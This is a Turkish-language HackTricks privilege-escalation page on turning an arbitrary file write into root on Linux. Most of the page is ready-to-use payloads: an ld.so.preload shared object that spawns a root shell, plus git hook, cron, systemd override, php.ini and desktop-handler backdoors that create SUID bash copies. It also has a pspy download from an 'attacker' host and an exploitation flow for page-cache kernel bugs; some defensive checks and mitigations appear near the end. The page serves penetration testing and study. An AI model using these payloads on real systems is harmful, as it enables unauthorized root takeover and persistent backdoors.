# Root'a Arbitrary File Write

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Bu dosya **`LD_PRELOAD`** env variable gibi davranır, ancak **SUID binaries** içinde de çalışır.\
Bu dosyayı oluşturabilir veya değiştirebilirseniz, çalıştırılan her binary ile birlikte **yüklenecek bir library'nin path'ini** eklemeniz yeterlidir.

Örneğin: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks), bir git repository'sindeki commit oluşturulması, merge gibi çeşitli **olaylarda** **çalıştırılan** **scriptlerdir**. Bu nedenle, bir **privileged script veya user** bu işlemleri sık sık gerçekleştiriyorsa ve **`.git` klasörüne yazmak** mümkünse, bu durum **privesc** için kullanılabilir.

Örneğin, yeni bir commit oluşturulduğunda her zaman çalıştırılması için bir git repo'sunda **`.git/hooks`** içinde **bir script oluşturmak** mümkündür:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron ve Zaman dosyaları

**root tarafından çalıştırılan cron ile ilgili dosyalara yazabiliyorsanız**, genellikle job bir sonraki çalıştığında code execution elde edebilirsiniz. İlginç hedefler şunlardır:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- `/var/spool/cron/` veya `/var/spool/cron/crontabs/` içindeki root'un kendi crontab'ı
- `systemd` timer'ları ve tetikledikleri servisler

Hızlı kontroller:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Yaygın kötüye kullanım yolları:

- `/etc/crontab` dosyasına veya `/etc/cron.d/` içindeki bir dosyaya **yeni bir root cron işi eklemek**
- `run-parts` tarafından zaten çalıştırılan bir **script'i değiştirmek**
- Script'i veya başlattığı binary'yi değiştirerek **mevcut bir timer hedefini backdoor'lamak**

Minimal cron payload örneği:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Yalnızca `run-parts` tarafından kullanılan bir cron dizinine yazabiliyorsanız, bunun yerine oraya çalıştırılabilir bir dosya bırakın:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notlar:

- `run-parts` genellikle nokta içeren dosya adlarını yok sayar; bu nedenle `backup.sh` yerine `backup` gibi adları tercih edin.
- Bazı dağıtımlar klasik cron yerine `anacron` veya `systemd` timer'ları kullanır, ancak abuse fikri aynıdır: **root'un daha sonra çalıştıracağı şeyi değiştirmek**.

### Service & Socket dosyaları

**`systemd` unit dosyalarına** veya bunların referans verdiği dosyalara yazabiliyorsanız, unit'i yeniden yükleyip yeniden başlatarak ya da service/socket activation yolunun tetiklenmesini bekleyerek root olarak kod çalıştırma elde edebilirsiniz.

İlginç hedefler şunlardır:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- `/etc/systemd/system/<unit>.d/*.conf` içindeki drop-in override'lar
- `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` tarafından referans verilen service script'leri/binary'leri
- Root service tarafından yüklenen, yazılabilir `EnvironmentFile=` yolları

Hızlı kontroller:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Yaygın abuse yolları:

- Root-owned bir service unit içinde değiştirebildiğiniz **`ExecStart=`** satırının üzerine yazmak
- Kötü amaçlı bir **`ExecStart=`** içeren bir **drop-in override** eklemek ve önce eski değeri temizlemek
- Unit tarafından zaten referans verilen script/binary dosyasına **backdoor** eklemek
- Socket bir bağlantı aldığında başlayan ilgili **`.service`** dosyasını değiştirerek socket-activated bir service'i **hijack** etmek

Kötü amaçlı override örneği:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Tipik etkinleştirme akışı:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Servisleri kendiniz yeniden başlatamıyor ancak socket-activated birimi düzenleyebiliyorsanız, root olarak backdoor eklenmiş servisin çalıştırılmasını tetiklemek için yalnızca **bir istemci bağlantısı beklemeniz** gerekebilir.

### Privileged PHP sandbox tarafından kullanılan kısıtlayıcı `php.ini` dosyasının üzerine yazma

Bazı özel daemon'lar, kullanıcı tarafından sağlanan PHP kodunu **kısıtlı bir `php.ini`** ile `php` çalıştırarak doğrular (örneğin, `disable_functions=exec,system,...`). Sandbox içindeki kodun hâlâ **herhangi bir yazma primitive'ine** (örneğin `file_put_contents`) sahip olması ve daemon tarafından kullanılan **tam `php.ini` yoluna** erişebilmeniz durumunda, kısıtlamaları kaldırmak için bu yapılandırmanın üzerine yazabilir ve ardından elevated privileges ile çalışan ikinci bir payload gönderebilirsiniz.

Tipik akış:

1. İlk payload sandbox yapılandırmasının üzerine yazar.
2. İkinci payload, dangerous functions yeniden etkinleştirildikten sonra kodu çalıştırır.

Minimal example (daemon tarafından kullanılan yolu değiştirin):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Daemon root olarak çalışıyorsa (veya root sahipli yollarla doğrulama yapıyorsa), ikinci çalıştırma bir root context elde eder. Bu, sandboxed runtime hâlâ dosya yazabiliyorsa, esasen **config overwrite üzerinden privilege escalation** işlemidir.

### binfmt_misc

`/proc/sys/fs/binfmt_misc` konumundaki dosya, hangi binary'nin hangi tür dosyaları çalıştırması gerektiğini belirtir. TODO: Yaygın bir dosya türü açıldığında rev shell çalıştırmak için bundan yararlanma gereksinimlerini kontrol et.

### Schema handler'larını (http: veya https: gibi) overwrite etme

Bir victim'ın configuration dizinleri üzerinde yazma izinlerine sahip bir attacker, sistem davranışını değiştiren dosyaları kolayca değiştirebilir veya oluşturabilir ve bunun sonucunda istenmeyen code execution elde edebilir. `$HOME/.config/mimeapps.list` dosyasını HTTP ve HTTPS URL handler'larını malicious bir dosyaya yönlendirecek şekilde değiştirerek (örneğin, `x-scheme-handler/http=evil.desktop` ayarlayarak), attacker **herhangi bir http veya https linkine tıklanmasının bu `evil.desktop` dosyasında belirtilen code'u çalıştırmasını** sağlar. Örneğin, aşağıdaki malicious code'u `$HOME/.local/share/applications` içindeki `evil.desktop` dosyasına yerleştirdikten sonra, herhangi bir external URL tıklaması gömülü command'ı çalıştırır:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Daha fazla bilgi için, gerçek bir vulnerability exploit etmek amacıyla kullanıldığı [**bu gönderiye**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) bakın.

### Root'un kullanıcı tarafından yazılabilir script/binary'leri çalıştırması

Privileged bir workflow `/bin/sh /home/username/.../script` gibi bir şey çalıştırıyorsa (veya unprivileged bir kullanıcıya ait bir dizinin içindeki herhangi bir binary'yi), bunu hijack edebilirsiniz:

- **Çalıştırmayı tespit edin:** Root'un kullanıcı tarafından kontrol edilen path'leri çağırdığını yakalamak için [pspy](https://github.com/DominicBreuker/pspy) ile process'leri monitor edin:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Yazılabilirliği doğrula:** hedef dosyanın ve dizininin sahibi olduğunuzdan ve bunların kullanıcı hesabınız tarafından yazılabilir olduğundan emin olun.
- **Hedefi ele geçir:** orijinal binary/script dosyasını yedekleyin ve SUID shell oluşturan (veya başka bir root eylemi gerçekleştiren) bir payload bırakın, ardından izinleri geri yükleyin:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Privileged action'ı tetikleyin** (ör. helper'ı başlatan bir UI button'a basarak). Root hijacked path'i yeniden çalıştırdığında, `./rootshell -p` ile escalated shell'i alın.

### Privileged binary'lerin yalnızca page-cache üzerinde dosya değiştirilmesi

Bazı kernel bug'ları dosyayı **disk üzerinde** değiştirmez. Bunun yerine yalnızca okunabilir bir dosyanın **page cache kopyasını** değiştirmenize izin verir. Bir **setuid** veya başka şekilde **root tarafından çalıştırılan** binary'yi hedefleyebilirseniz, sonraki çalıştırma bellekteki attacker-controlled byte'ları kullanarak çalışabilir ve diskteki file hash değişmeden privilege escalation sağlayabilir.

Bunu **yalnızca runtime'da kullanılabilen file write primitive** olarak düşünmek faydalıdır:

- **Disk temiz kalır**: inode ve disk üzerindeki byte'lar değişmez
- **Memory dirty olur**: cache'lenmiş page'i okuyan/çalıştıran process'ler attacker tarafından değiştirilmiş içeriği alır
- **Etki geçicidir**: değişiklik reboot veya cache eviction sonrasında kaybolur

Bu primitive, klasik **arbitrary file write** ile Dirty COW / Dirty Pipe gibi eski **page-cache abuse** bug'ları arasında yer alır:

- Dirty COW bir race condition'a dayanıyordu
- Dirty Pipe'ın write-position kısıtlamaları vardı
- Page-cache-only primitive, vulnerable path cache'lenmiş file-backed page'lere doğrudan write veriyorsa daha reliable olabilir

#### Generic privesc flow

1. **File-backed page cache page'lerine** write yapabilen bir kernel primitive elde edin
2. Bunu **readable privileged binary** veya root tarafından çalıştırılan başka bir dosya üzerinde kullanın
3. Page cache'den evict edilmeden önce execution'ı tetikleyin
4. On-disk file hâlâ değiştirilmemiş görünürken root olarak code execution elde edin

Yüksek değerli tipik hedefler:

- **setuid-root** binary'leri
- **root service'ler** tarafından başlatılan helper'lar
- **host kernel/page cache'i paylaşan container'larda** yaygın olarak çalıştırılan binary'ler

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) bu sınıfa iyi bir örnektir. Vulnerable path, Linux crypto userspace API'sindeydi (`AF_ALG` / `algif_aead`):

- `splice()`, page-cache page'lerine ait referansları readable file'dan crypto TX scatterlist'ine taşıyabilir
- in-place `algif_aead` decrypt path'i source ve destination buffer'larını yeniden kullanıyordu
- `authencesn` daha sonra destination tag region'a write yapıyordu
- bu region hâlâ spliced file-backed page'lere referans veriyorsa, write hedef dosyanın **page cache'ine** ulaşıyordu

Buradaki ilginç teknik CVE'nin kendisi değil, şu pattern'dir:

- **file-backed cache page'lerini bir kernel subsystem'ine beslemek**
- subsystem'in bunları **writable output** olarak ele almasını sağlamak
- memory içinde küçük ve kontrollü bir overwrite tetiklemek

Public PoC, `/usr/bin/su` dosyasını memory'de patch etmek ve ardından çalıştırmak için tekrarlanan **4-byte write** işlemleri kullandı.

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503), bu kez sink olarak `AF_ALG` yerine **IPsec ESP decrypt** kullanan aynı **page-cache-only write-to-root** pattern'inin başka bir varyantını gösterir.

Önemli teknik **metadata-laundering** adımıdır:

- `splice()`, **read-only file-backed page-cache page'ini** bir ESP-in-UDP packet'ine yerleştirir
- orijinal DirtyFrag mitigation, `esp_input()` decrypt öncesinde **copy** yapsın diye skb'yi `SKBFL_SHARED_FRAG` ile tag'liyordu
- netfilter `TEE`, packet'i `nf_dup_ipv4()` -> `__pskb_copy_fclone()` üzerinden duplicate eder
- clone aynı physical page-cache reference'ını korur, ancak `SKBFL_SHARED_FRAG` değerini kaybeder
- `esp_input()` clone'u safe kabul eder ve file-backed page üzerinde **in-place `cbc(aes)` decrypt** çalıştırır

Bu nedenle reviewer dersi CVE'den daha geneldir: Bir mitigation, bir operation'ın önce copy yapıp yapmayacağına karar vermek için **skb/page metadata**'sına dayanıyorsa, backing page'i koruyup metadata'yı kaldıran herhangi bir **clone/copy path**, write primitive'i sessizce yeniden açabilir.

Tipik exploitation flow:

1. Private bir network namespace içinde **`CAP_NET_ADMIN`** elde etmek için `unshare(CLONE_NEWUSER | CLONE_NEWNET)` kullanın
2. Loopback'i aktif edin ve `mangle/OUTPUT` içine bir **netfilter `TEE` rule** yükleyin
3. `NETLINK_XFRM` üzerinden **XFRM ESP transport SA**'ları yükleyin
4. Her hedef 4-byte word'ü SA `seq_hi` field'ında encode edin (DirtyFrag'in word-selection trick'i)
5. **TEE clone**'un `esp_input()`'e ulaşması ve **in place** decrypt yapması için spliced ESP-in-UDP packet'ini gönderin
6. `/usr/bin/su` veya başka bir privileged executable'ın page-cache kopyası attacker-controlled code içerene kadar tekrarlayın

Operasyonel olarak etki, `AF_ALG` örneğindekiyle aynıdır: Diskteki file temiz kalır, ancak `execve()` **mutated page-cache byte'larını** kullanır ve root elde edilmesini sağlar.

Bu varyant için faydalı exposure kontrolleri:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Kısa vadeli attack-surface reduction burada da path-specific'tir: `48f6a5356a33` taşıyan bir kernel'e yükseltmek clone path'ini düzeltirken, `xt_TEE` autoload'unu engellemek **flag-laundering adımını** kaldırır ve `esp4` / `esp6`'yı engellemek **decrypt sink'ini** kaldırır.

#### Exposure ve hunting

Bu bug sınıfından şüpheleniyorsanız yalnızca disk bütünlüğü kontrollerine güvenmeyin. Ayrıca şunları doğrulayın:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` bir module olarak yüklenebilir/boşaltılabilir
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interface kernel içine yerleşiktir
- setuid binaries iyi hedeflerdir; çünkü yalnızca page-cache patch'i, local foothold'u root'a dönüştürmek için yeterli olabilir

#### `algif_aead` path'i için attack-surface reduction

Vulnerable interface yüklenebilir bir module tarafından sağlanıyorsa:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Kernel içine derlenmişse, bazı disclosure'ların init path'i şu şekilde engellediği bildirilmiştir:
```bash
initcall_blacklist=algif_aead_init
```
Bu tür bir mitigation, diğer kernel LPE'leri için de hatırlanmaya değer: exploitation belirli bir optional interface'e bağlıysa, bu interface'i devre dışı bırakmak veya blacklist'e eklemek, full kernel upgrade kullanılabilir olmadan önce bile exploit yolunu kesebilir.

## References

- [HTB Bamboo – user-writable bir PaperCut dizinindeki root tarafından çalıştırılan script'in hijacking edilmesi](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [CVE-2026-31431 için Openwall oss-security disclosure'ı](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Linux stable fix: crypto: algif_aead - out-of-place çalışmaya geri dön](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Copy Fail advisory](https://copy.fail/)
- [Theori / Xint technical writeup'ı](https://xint.io/blog/copy-fail-linux-distributions)
- [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [JFrog: Linux LPE Variant DirtyClone'u (CVE-2026-43503) inceleme ve exploitation](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [Linux fix: net: skb: `__pskb_copy_fclone()` içinde `SKBFL_SHARED_FRAG` değerini koru (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [Linux earlier mitigation: splice edilmiş UDP packet'leri için `SKBFL_SHARED_FRAG` ayarla (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)

{{#include ../../banners/hacktricks-training.md}}
